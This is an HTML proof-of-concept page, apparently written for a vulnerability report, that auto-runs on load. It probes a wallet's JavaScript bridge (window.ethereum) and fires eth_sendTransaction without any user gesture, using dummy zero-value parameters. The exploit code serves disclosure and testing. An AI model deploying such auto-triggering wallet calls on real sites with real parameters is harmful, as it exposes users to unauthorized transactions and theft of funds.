<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security PoC: JS Bridge Exposure</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; color: #333; }
        .log-container { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', Courier, monospace; height: 350px; overflow-y: scroll; font-size: 14px; }
        h2 { border-bottom: 2px solid #ddd; padding-bottom: 10px; }
        .badge { padding: 5px 10px; border-radius: 4px; font-weight: bold; }
        .critical { background: #ff4d4d; color: white; }
    </style>
</head>
<body>
    <h2>Security Proof of Concept</h2>
    <p>Status: <span id="status" class="badge critical">Initializing...</span></p>
    <div id="log-container" class="log-container"></div>

    <script>
        const logContainer = document.getElementById('log-container');
        function log(msg) {
            const div = document.createElement('div');
            div.textContent = `[${new Date().toISOString().split('T')[1].split('.')[0]}] ${msg}`;
            logContainer.appendChild(div);
            logContainer.scrollTop = logContainer.scrollHeight;
        }

        async function runExploit() {
            log("Starting Bridge Exposure Test...");
            
            // Mengakses objek bridge yang terdeteksi di video Anda
            const bridge = window.ethereum;

            if (!bridge) {
                log("[-] Error: Bridge object not found.");
                document.getElementById('status').textContent = "Failed";
                return;
            }

            log("[+] Bridge object found: " + Object.keys(bridge).join(', '));
            log("[!] Triggering 'eth_sendTransaction' without user gesture...");

            try {
                // Parameter transaksi dummy (Sesuai dengan apa yang muncul di video Anda)
                const txParams = {
                    from: '0x0000000000000000000000000000000000000000',
                    to: '0x0000000000000000000000000000000000000000',
                    value: '0x00',
                    data: '0x'
                };

                // Memicu transaksi secara otomatis
                const result = await bridge.request({
                    method: 'eth_sendTransaction',
                    params: [txParams]
                });

                log("[+] Success: Result received: " + JSON.stringify(result));
            } catch (err) {
                log("[!] Transaction prompt triggered or rejected: " + err.message);
                document.getElementById('status').textContent = "Triggered";
            }
        }

        // Jalankan otomatis saat page load
        window.onload = () => runExploit();
    </script>
</body>
</html>
